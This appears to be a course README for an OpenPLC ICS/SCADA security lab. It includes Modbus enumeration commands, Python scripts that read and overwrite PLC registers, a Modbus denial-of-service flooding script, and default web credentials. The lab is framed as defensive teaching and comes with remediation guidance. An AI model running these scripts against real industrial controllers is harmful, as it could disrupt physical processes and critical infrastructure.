# Lab 7: OT Security & ICS/SCADA (OpenPLC)

## Overview

Lab 7 teaches Operational Technology (OT) security, Industrial Control Systems (ICS), and SCADA security. Students will learn to enumerate, interact with, and compromise PLCs using OpenPLC, Modbus protocol, and ICS-specific tools.

## Requirements

- Docker Engine 24.0+
- Docker Compose 2.0+
- 3GB RAM minimum (4GB recommended)
- 5GB free disk space

## Architecture

```
┌──────────────────────────────────────────┐
│        Docker Network (172.18.7.0/24)    │
├──────────────────────────────────────────┤
│  OpenPLC (172.18.7.20)                   │
│  ├── PLC Simulator                       │
│  ├── Modbus TCP/UDP Server               │
│  ├── Web UI (Port 8080)                  │
│  └── Industrial Protocol Services        │
│                                          │
│  Kali Linux (172.18.7.10)                │
│  ├── Modbus Interaction Tools            │
│  ├── PLC Exploitation Tools              │
│  ├── ICS Reconnaissance                  │
│  └── Network Scanning                    │
└──────────────────────────────────────────┘
```

## Quick Start

### 1. Start the Lab

```bash
cd lab7
docker-compose up -d
```

### 2. Wait for OpenPLC to start

```bash
docker-compose logs -f openplc

# Wait for "Listening on port 8080" message
```

### 3. Access OpenPLC Web UI

Open browser: `http://localhost:8080`

Default credentials:
- Username: `admin`
- Password: `openplc`

### 4. Connect to Kali

```bash
docker-compose exec kali /bin/bash
```

## Learning Objectives

By the end of this lab, students will be able to:

- ✓ Understand PLC and SCADA architecture
- ✓ Enumerate Modbus devices
- ✓ Read and write Modbus registers
- ✓ Identify ICS vulnerabilities
- ✓ Exploit weak authentication
- ✓ Demonstrate impact of PLC compromise
- ✓ Understand ICS/SCADA security controls

## OT/ICS Fundamentals

### Common Protocols

1. **Modbus** (open, no security)
   - TCP: Port 502
   - UDP: Port 502
   - Unencrypted, no authentication

2. **Profibus** (Siemens)
   - Serial protocol for industrial devices

3. **DNP3** (Power systems)
   - Supervisory control and data acquisition

4. **OPC UA** (Microsoft/OPC Foundation)
   - Industrial interoperability standard

### Modbus Data Types

```
Coils (Read/Write)
├── Digital outputs (0-1)
└── Boolean values

Discrete Inputs (Read only)
└── Digital inputs

Holding Registers (Read/Write)
└── 16-bit values (0-65535)

Input Registers (Read only)
└── 16-bit sensor readings
```

## Exercises

### Exercise 1: Modbus Enumeration

**Objective**: Discover and enumerate Modbus devices

From Kali container:

```bash
# 1. Port scanning for Modbus
nmap -p 502 172.18.7.20

# 2. Modbus port scan with nmap
nmap -p 502 --script=modbus-identify 172.18.7.20

# 3. Check if Modbus is running
nc -zv 172.18.7.20 502
```

### Exercise 2: Read Modbus Coils

**Objective**: Read data from PLC

Create file `read_coils.py`:

```python
#!/usr/bin/env python3

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import time

def read_coils(host, port=502):
    """Read Modbus coils from PLC"""
    
    client = ModbusTcpClient(host=host, port=port)
    
    try:
        # Connect to PLC
        if not client.connect():
            print("[-] Failed to connect to Modbus server")
            return
        
        print("[+] Connected to Modbus server")
        
        # Read coils (0-10)
        print("\n[*] Reading Coils (Address 0-10):")
        result = client.read_coils(address=0, count=10)
        
        if result.isError():
            print("[-] Error reading coils:", result)
        else:
            for idx, value in enumerate(result.bits):
                print(f"  Coil {idx}: {value}")
        
        # Read discrete inputs
        print("\n[*] Reading Discrete Inputs (Address 0-10):")
        result = client.read_discrete_inputs(address=0, count=10)
        
        if result.isError():
            print("[-] Error reading discrete inputs:", result)
        else:
            for idx, value in enumerate(result.bits):
                print(f"  Input {idx}: {value}")
        
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    read_coils("172.18.7.20")
```

Run it:

```bash
python3 read_coils.py
```

### Exercise 3: Write Modbus Registers

**Objective**: Modify PLC register values

Create file `write_registers.py`:

```python
#!/usr/bin/env python3

from pymodbus.client import ModbusTcpClient

def write_registers(host, port=502):
    """Write values to Modbus registers"""
    
    client = ModbusTcpClient(host=host, port=port)
    
    try:
        if not client.connect():
            print("[-] Failed to connect")
            return
        
        print("[+] Connected to Modbus server")
        
        # Write single register
        print("\n[*] Writing value 100 to register 0:")
        result = client.write_register(address=0, value=100)
        
        if result.isError():
            print("[-] Error:", result)
        else:
            print("[+] Successfully wrote value")
        
        # Write multiple registers
        print("\n[*] Writing values to registers 1-3:")
        values = [200, 300, 400]
        result = client.write_registers(address=1, values=values)
        
        if result.isError():
            print("[-] Error:", result)
        else:
            print("[+] Successfully wrote values")
        
        # Read back to verify
        print("\n[*] Reading back registers 0-3:")
        result = client.read_holding_registers(address=0, count=4)
        
        if result.isError():
            print("[-] Error reading:", result)
        else:
            for idx, value in enumerate(result.registers):
                print(f"  Register {idx}: {value}")
        
    finally:
        client.close()

if __name__ == "__main__":
    write_registers("172.18.7.20")
```

Run it:

```bash
python3 write_registers.py
```

### Exercise 4: OpenPLC Program Upload

**Objective**: Create and upload PLC ladder logic

1. Access OpenPLC UI: `http://localhost:8080`
2. Login with default credentials
3. Create new program:
   - Language: Ladder Logic
   - Simple control program

4. Program example (Ladder Logic):

```
|----[ ]----( )---|
   Input    Output

RUNG 1:
Input0 --[ ]--+-- Output0 --(#)--
              |
         [ ]--+
       Input1
```

5. Upload and compile program
6. Monitor program execution in Web UI

### Exercise 5: Denial of Service Attack

**Objective**: Demonstrate DoS impact on PLC

Create file `dos_attack.py`:

```python
#!/usr/bin/env python3

import socket
import time
import sys

def modbus_dos(host, port=502, duration=10):
    """Simple Modbus DoS attack"""
    
    print(f"[*] Initiating Modbus DoS against {host}:{port}")
    print(f"[*] Duration: {duration} seconds")
    
    start_time = time.time()
    packet_count = 0
    
    # Malformed Modbus packet
    malformed_packet = b'\x00\x01\x00\x00\xFF\xFF'
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            sock.sendall(malformed_packet * 100)
            sock.close()
            packet_count += 1
            
            if packet_count % 10 == 0:
                print(f"[+] Sent {packet_count} attack packets")
            
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print(f"\n[+] Attack completed")
    print(f"[+] Total packets sent: {packet_count}")
    print(f"[!] WARNING: This demonstrates impact - NOT for use in production!")

if __name__ == "__main__":
    modbus_dos("172.18.7.20", duration=5)
```

Run it:

```bash
python3 dos_attack.py
```

### Exercise 6: Vulnerability Assessment

**Objective**: Document ICS vulnerabilities

Create file `ics_assessment.md`:

```markdown
# ICS/SCADA Security Assessment
## Target: OpenPLC (172.18.7.20)

### Executive Summary
- Device Type: Programmable Logic Controller (PLC)
- Protocol: Modbus TCP
- Security Level: CRITICAL

### Findings

#### CRITICAL Issues
1. **No Authentication** on Modbus protocol
   - Impact: Unauthorized read/write
   - Fix: Implement access controls

2. **Unencrypted Communication**
   - Impact: Man-in-the-middle attacks
   - Fix: Use Modbus with TLS/SSL

3. **No Input Validation**
   - Impact: Malformed packets crash PLC
   - Fix: Validate all inputs

#### HIGH Issues
1. **Weak Web UI Credentials**
   - Default admin/openplc
   - Fix: Enforce strong passwords

2. **Unnecessary Services Exposed**
   - Fix: Firewall access to Modbus

### Remediation Plan
1. Change default credentials
2. Firewall Modbus port (502)
3. Implement authentication
4. Use VPN for remote access
5. Monitor for suspicious activity
```

## Tools Available

### Modbus Scanning

```bash
# Nmap Modbus scripts
nmap -p 502 --script=modbus-discover 172.18.7.20
nmap -p 502 --script=modbus-identify 172.18.7.20
```

### Python Modbus Libraries

```bash
# Already installed in Kali
python3 -c "from pymodbus.client import ModbusTcpClient; print('OK')"

# Also available: modbus-tk
python3 -c "import modbus_tk; print('OK')"
```

### Command Line Tools

```bash
# modbus_cli (if available)
python3 -m pymodbus.console --host 172.18.7.20

# nc (basic connectivity)
nc -zv 172.18.7.20 502
```

## OpenPLC Web Interface

### Key Features

1. **Devices Tab**
   - View connected devices
   - Monitor live data

2. **Programs Tab**
   - Upload ladder logic
   - View program status
   - Monitor variables

3. **Dashboard**
   - Real-time monitoring
   - Coil/register values
   - Performance metrics

4. **Settings**
   - Configure network
   - Change credentials
   - Enable/disable services

## Troubleshooting

### OpenPLC not accessible

```bash
# Check container status
docker-compose ps

# Check logs
docker-compose logs openplc

# Restart
docker-compose restart openplc
```

### Can't connect to Modbus

```bash
# Verify port is open
nc -zv 172.18.7.20 502

# Check firewall
docker-compose exec kali iptables -L

# Restart network
docker-compose down
docker-compose up -d
```

### Python script fails

```bash
# Install missing packages
pip3 install pymodbus modbus-tk

# Verify installation
python3 -c "from pymodbus.client import ModbusTcpClient"
```

## Cleanup

### Stop containers

```bash
docker-compose stop
```

### Remove containers

```bash
docker-compose down
```

### Complete cleanup

```bash
docker-compose down -v
```

## Safety Note

⚠️ **WARNING**: These labs demonstrate ICS vulnerabilities for educational purposes only. Do NOT:

- Perform attacks on real industrial systems
- Test on production PLC/SCADA systems
- Interfere with critical infrastructure
- Violate local laws and regulations

Always obtain proper authorization before testing.

## Resources

- [OpenPLC Project](http://www.openplcproject.com/)
- [Modbus Protocol Specification](https://en.wikipedia.org/wiki/Modbus)
- [NIST ICS Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r3.pdf)
- [ICS-CERT Alerts](https://www.cisa.gov/industrial-control-systems-cyber-security-advisories-alerts)
- [PyModbus Documentation](https://github.com/riptideio/pymodbus)

## Success Criteria

You have completed Lab 7 when you can:

- ✓ Connect to OpenPLC via Modbus protocol
- ✓ Read coils and registers from PLC
- ✓ Write values to PLC registers
- ✓ Upload and execute PLC programs
- ✓ Demonstrate vulnerability impact
- ✓ Document ICS security issues
- ✓ Explain SCADA attack vectors

## Next Steps

After completing Lab 7, you should:

1. Study ICS security hardening
2. Learn about air-gapped networks
3. Move to Lab 8: Final Project
4. Integrate all knowledge into capstone

---

**Lab Created**: March 2026  
**Last Updated**: March 2026  
**Status**: Ready for Student Use
